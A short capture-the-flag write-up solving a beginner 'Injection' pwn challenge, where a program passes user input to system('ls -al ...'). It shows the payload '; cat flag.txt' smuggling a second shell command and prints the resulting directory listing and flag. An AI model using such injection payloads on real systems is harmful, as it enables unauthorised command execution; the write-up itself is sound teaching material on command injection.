> # Pwn - Injection
> > Pwn - 100pts
>
> I made this program so that I could `ls -al` the files on my server, but not view the contents of them. After all, I would not want anyone to view the flag except for me...

## Writeup
The program executes `system("ls -al <our_input>")`, with `<our_input>` being the input we supply.

We can execute an arbitrary command if the first character of our input is `;`, e.g., `; cat flag.txt`. The program will then execute `system("ls -al; cat flag.txt")`, which will first run the `ls -al` command, and then `cat flag.txt`.

```console
What do you want to 'ls'?
; cat flag.txt
total 64
drwxr-xr-x 2 loevland loevland  4096 Feb  2 15:01 .
drwxr-xr-x 4 loevland loevland  4096 Feb  1 00:53 ..
-rw-r--r-- 1 loevland loevland   261 Feb  1 00:49 Dockerfile
-rw-r--r-- 1 loevland loevland    50 Jan  1 14:17 Makefile
-rw-r--r-- 1 loevland loevland    23 Feb  1 00:49 flag.txt
-rwxr-xr-x 1 loevland loevland 16672 Feb  1 00:49 vuln
-rw-r--r-- 1 loevland loevland   907 Feb  1 00:49 vuln.c
-rwxr-xr-x 1 loevland loevland 18648 Jan  1 14:17 ynetd
TD{pwn3d_by_1nj3c7i0n}
```